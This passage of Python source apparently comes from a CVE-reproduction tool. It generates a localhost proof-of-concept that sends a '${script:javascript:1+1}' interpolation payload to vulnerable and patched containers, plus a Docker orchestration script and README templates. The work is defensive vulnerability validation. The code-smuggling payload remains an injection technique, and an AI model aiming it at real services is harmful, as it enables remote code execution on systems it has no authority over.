VULNERABLE_BASE_URL = "http://127.0.0.1:{vulnerable_port}"
PATCHED_BASE_URL = "http://127.0.0.1:{patched_port}"


PROBE_BODY = "${{script:javascript:1+1}}".encode("utf-8")


def probe(base_url: str) -> dict:
    try:
        request = urllib.request.Request(
            f"{{base_url}}/lookup",
            data=PROBE_BODY,
            headers={{"Content-Type": "text/plain"}},
            method="POST",
        )
        with urllib.request.urlopen(request, timeout=5) as response:
            return {{
                "base_url": base_url,
                "status": response.status,
                "body_prefix": response.read(512).decode("utf-8", errors="replace"),
            }}
    except Exception as exc:
        return {{"base_url": base_url, "status": None, "error": str(exc)}}


def summarize(record: dict) -> dict:
    status = record.get("status")
    body = record.get("body_prefix", "") or ""
    if status is not None and 200 <= status < 300 and "2" in body:
        return {{
            "base_url": record["base_url"],
            "triggered": True,
            "detail": "lookup prefix evaluated server-side",
        }}
    return {{
        "base_url": record["base_url"],
        "triggered": False,
        "detail": f"status={{status}} did not evaluate lookup",
    }}


def main() -> int:
    vulnerable = probe(VULNERABLE_BASE_URL)
    patched = probe(PATCHED_BASE_URL)
    summary = {{
        "cve_id": "{cve_id}",
        "vulnerable": summarize(vulnerable),
        "patched": summarize(patched),
        "raw": {{"vulnerable": vulnerable, "patched": patched}},
    }}
    print(json.dumps(summary, indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
'''.format(
        cve_id=cve.cve_id,
        cve_name=cve.name,
        vulnerable_port=base_port,
        patched_port=base_port + 1,
    )


def _poc_runner_script(cve: CveRecord, base_port: int = 4000) -> str:
    return "\n".join(
        [
            "#!/usr/bin/env bash",
            "# Harness orchestration: build images, start vulnerable and patched",
            "# services on 127.0.0.1 only, run the PoC, capture evidence, tear down.",
            "set -euo pipefail",
            f'echo "[cvehunt] orchestrating harness for {cve.cve_id}"',
            'pushd "$(dirname "$0")/.." >/dev/null',
            "mkdir -p exploiter/logs",
            'exec > >(tee exploiter/logs/run-poc.log) 2>&1',
            "compose_available() { docker compose version >/dev/null 2>&1 || command -v docker-compose >/dev/null 2>&1; }",
            "compose_cmd() {",
            "  if docker compose version >/dev/null 2>&1; then docker compose \"$@\"; else docker-compose \"$@\"; fi",
            "}",
            "image_for() {",
            "  awk -v svc=\"$1:\" '$1 == svc {inside=1; next} inside && $1 == \"image:\" {print $2; exit} /^[^[:space:]]/ {inside=0}' harness/docker-compose.yml",
            "}",
            "manual_names() {",
            f'  PROJECT="cvehunt_{cve.cve_id.lower().replace("-", "_")}_$$"',
            '  NET="${PROJECT}_net"; DB="${PROJECT}_db"; VULN="${PROJECT}_vulnerable"; PATCHED="${PROJECT}_patched"; SHIM_VULN="${PROJECT}_shim_vulnerable"; SHIM_PATCHED="${PROJECT}_shim_patched"',
            "}",
            "manual_build() {",
            "  manual_names",
            "  VULN_IMAGE=$(image_for vulnerable); PATCHED_IMAGE=$(image_for patched); SHIM_VULN_IMAGE=$(image_for shim-vulnerable || true); SHIM_PATCHED_IMAGE=$(image_for shim-patched || true)",
            "  docker build -t \"$VULN_IMAGE\" -f harness/Dockerfile.vulnerable .",
            "  docker build -t \"$PATCHED_IMAGE\" -f harness/Dockerfile.patched .",
            "  if [ -n \"${SHIM_VULN_IMAGE:-}\" ] && [ -f harness/shim/vulnerable/Dockerfile ]; then docker build -t \"$SHIM_VULN_IMAGE\" harness/shim/vulnerable; fi",
            "  if [ -n \"${SHIM_PATCHED_IMAGE:-}\" ] && [ -f harness/shim/patched/Dockerfile ]; then docker build -t \"$SHIM_PATCHED_IMAGE\" harness/shim/patched; fi",
            "}",
            "manual_up() {",
            "  manual_names",
            "  VULN_IMAGE=$(image_for vulnerable); PATCHED_IMAGE=$(image_for patched); SHIM_VULN_IMAGE=$(image_for shim-vulnerable || true); SHIM_PATCHED_IMAGE=$(image_for shim-patched || true)",
            "  docker network create \"$NET\" >/dev/null",
            "  if [ -f harness/db-init.sql ]; then",
            "    docker run -d --name \"$DB\" --network \"$NET\" --network-alias db -e POSTGRES_USER=litellm -e POSTGRES_PASSWORD=litellm -e POSTGRES_DB=litellm -v \"$PWD/harness/db-init.sql:/docker-entrypoint-initdb.d/01-init.sql:ro\" postgres:16-alpine >/dev/null",
            "    for _ in $(seq 1 60); do docker exec \"$DB\" pg_isready -U litellm -d litellm >/dev/null 2>&1 && break; sleep 2; done",
            "  fi",
            "  if [ -f harness/config.yaml ]; then",
            f"    docker run -d --name \"$VULN\" --network \"$NET\" -p 127.0.0.1:{base_port}:4000 -e DATABASE_URL=postgresql://litellm:litellm@db:5432/litellm_vuln -e LITELLM_MASTER_KEY=sk-harness-master -e STORE_MODEL_IN_DB=True -v \"$PWD/harness/config.yaml:/workspace/config.yaml:ro\" \"$VULN_IMAGE\" litellm --host 0.0.0.0 --port 4000 --config /workspace/config.yaml >/dev/null",
            f"    docker run -d --name \"$PATCHED\" --network \"$NET\" -p 127.0.0.1:{base_port + 1}:4000 -e DATABASE_URL=postgresql://litellm:litellm@db:5432/litellm_patched -e LITELLM_MASTER_KEY=sk-harness-master -e STORE_MODEL_IN_DB=True -v \"$PWD/harness/config.yaml:/workspace/config.yaml:ro\" \"$PATCHED_IMAGE\" litellm --host 0.0.0.0 --port 4000 --config /workspace/config.yaml >/dev/null",
            "  else",
            f"    docker run -d --name \"$VULN\" --network \"$NET\" -p 127.0.0.1:{base_port}:4000 \"$VULN_IMAGE\" >/dev/null",
            f"    docker run -d --name \"$PATCHED\" --network \"$NET\" -p 127.0.0.1:{base_port + 1}:4000 \"$PATCHED_IMAGE\" >/dev/null",
            "  fi",
            f"  if [ -n \"${{SHIM_VULN_IMAGE:-}}\" ]; then docker run -d --name \"$SHIM_VULN\" --network \"$NET\" -p 127.0.0.1:{base_port + 10}:8000 \"$SHIM_VULN_IMAGE\" >/dev/null; fi",
            f"  if [ -n \"${{SHIM_PATCHED_IMAGE:-}}\" ]; then docker run -d --name \"$SHIM_PATCHED\" --network \"$NET\" -p 127.0.0.1:{base_port + 11}:8000 \"$SHIM_PATCHED_IMAGE\" >/dev/null; fi",
            "}",
            "manual_logs() { manual_names; for name in \"$DB\" \"$VULN\" \"$PATCHED\" \"$SHIM_VULN\" \"$SHIM_PATCHED\"; do echo \"===== $name =====\"; docker logs --tail 200 \"$name\" 2>&1 || true; done; }",
            "manual_down() { manual_names; docker rm -f \"$DB\" \"$VULN\" \"$PATCHED\" \"$SHIM_VULN\" \"$SHIM_PATCHED\" >/dev/null 2>&1 || true; docker network rm \"$NET\" >/dev/null 2>&1 || true; }",
            "capture_logs() {",
            "  if compose_available; then compose_cmd -f harness/docker-compose.yml logs --no-color --tail 200 >exploiter/logs/compose.log 2>&1 || true; else manual_logs >exploiter/logs/compose.log 2>&1 || true; fi",
            "}",
            "cleanup() {",
            "  capture_logs",
            "  if compose_available; then compose_cmd -f harness/docker-compose.yml down --remove-orphans >/dev/null 2>&1 || true; else manual_down; fi",
            "}",
            "trap cleanup EXIT",
            "if compose_available; then compose_cmd -f harness/docker-compose.yml build; compose_cmd -f harness/docker-compose.yml up -d; else echo '[cvehunt] docker compose unavailable; using direct docker fallback'; manual_build; manual_up; fi",
            "mkdir -p provision",
            ": > provision/provision.tsv",
            "probe_target() {",
            '  name="$1"; port="$2"',
            f'  if curl --silent --fail --max-time 3 http://127.0.0.1:${{port}}/health/readiness >/dev/null 2>&1; then',
            '    printf "%s\t%s\t1\n" "$name" "$port" >> provision/provision.tsv',
            "  else",
            '    printf "%s\t%s\t0\n" "$name" "$port" >> provision/provision.tsv',
            "  fi",
            "  return 0",
            "}",
            f'echo "[cvehunt] best-effort readiness: upstream 127.0.0.1:{base_port} and :{base_port + 1}"',
            "for _ in $(seq 1 90); do",
            f'  if curl --silent --fail http://127.0.0.1:{base_port}/health/readiness >/dev/null 2>&1 \\',
            f'    && curl --silent --fail http://127.0.0.1:{base_port + 1}/health/readiness >/dev/null 2>&1; then',
            "    break",
            "  fi",
            "  sleep 2",
            "done",
            f'echo "[cvehunt] best-effort readiness: shim 127.0.0.1:{base_port + 10} and :{base_port + 11}"',
            "for _ in $(seq 1 30); do",
            f'  if curl --silent --fail http://127.0.0.1:{base_port + 10}/health/readiness >/dev/null 2>&1 \\',
            f'    && curl --silent --fail http://127.0.0.1:{base_port + 11}/health/readiness >/dev/null 2>&1; then',
            "    break",
            "  fi",
            "  sleep 2",
            "done",
            f'probe_target vulnerable {base_port}',
            f'probe_target patched {base_port + 1}',
            f'probe_target shim-vulnerable {base_port + 10}',
            f'probe_target shim-patched {base_port + 11}',
            "python3 - <<'PROVISIONPY'",
            "import csv, json",
            "rows=[r for r in csv.reader(open('provision/provision.tsv'), delimiter='\t') if len(r)==3]",
            "targets=[{'name':r[0],'url':f'http://127.0.0.1:{r[1]}','ready':r[2]=='1','servable':r[2]=='1','detail':('readiness HTTP 200' if r[2]=='1' else 'no readiness response')} for r in rows]",
            "servable=sum(1 for t in targets if t['servable'])",
            "status='servable' if targets and servable==len(targets) else ('partially_servable' if servable else 'not_servable')",
            "note=f'{servable}/{len(targets)} targets servable'",
            "open('provision/provision.json','w').write(json.dumps({'status':status,'note':note,'targets':targets}, indent=2)+'\n')",
            "open('provision/provision.log','w').write(f'[provision] {status}: {note}\n')",
            "print(f'provision: {status} ({note})')",
            "PROVISIONPY",
            "python3 exploiter/poc.py | tee exploiter/outcome.json || true",
            "popd >/dev/null",
            "",
        ]
    )


def _exploiter_stub_readme(cve: CveRecord) -> str:
    return (
        f"# Exploiter Scaffold: {cve.cve_id}\n\n"
        "Harness materialization was unavailable for this CVE, so the Exploiter "
        "stage did not produce a PoC scaffold. Resolve the harness first.\n"
    )


def _exploiter_unsupported_class_readme(
    cve: CveRecord,
    finding: ResearchFinding,
) -> str:
    return (
        f"# Exploiter Scaffold: {cve.cve_id}\n\n"
        f"No localhost-scoped PoC template exists for vulnerability class "
        f"`{finding.vulnerability_class}`. Add a dispatcher entry in "
        "`_select_poc_template` and a corresponding template function "
        "before re-running the Exploiter for this CVE.\n"
    )


def _exploiter_scaffolded_readme(
    cve: CveRecord,
    finding: ResearchFinding,
) -> str:
    return (
        f"# Exploiter Scaffold: {cve.cve_id}\n\n"
        f"- Vulnerability class: {finding.vulnerability_class}\n"
        f"- Impacted surface: {finding.impacted_surface}\n"
        f"- Patch signal: {finding.relevant_patch_signal}\n\n"
        "## Files\n\n"
        "- `exploiter/poc.py` — harness-bound probe script. Targets 127.0.0.1\n"
        "  exclusively and prints a structured JSON differential of the\n"
        "  vulnerable vs. patched harness responses on stdout.\n"
        "- `exploiter/run-poc.sh` — orchestration runner. Builds the\n"
        "  vulnerable and patched containers, brings up the compose stack,\n"
        "  waits for readiness, runs `poc.py`, writes\n"
        "  `exploiter/outcome.json`, and tears the stack down on exit.\n\n"
        "## Scope\n\n"
        "The PoC has hardcoded `127.0.0.1` targets. There is no environment\n"
        "override, no configurable host, and no credential exfiltration.\n"
        "It validates the harness, not real deployments.\n"
    )


def _fix_rationale(
    cve: CveRecord,
    finding: ResearchFinding,
    sources: SourceBundle,
) -> str:
    return (
        f"# Candidate Fix Rationale: {cve.cve_id}\n\n"
        f"- Package: {sources.package}\n"
        f"- Vulnerable: {sources.vulnerable_version}\n"
        f"- Patched: {sources.patched_version}\n"
        f"- Class: {finding.vulnerability_class}\n"
        f"- Patch signal: {finding.relevant_patch_signal}\n\n"
        "The candidate patch is the unmodified upstream diff between the\n"
        "vulnerable and patched releases. It is treated as the authoritative\n"
        "remediation for the harness-bound PoC.\n"
    )
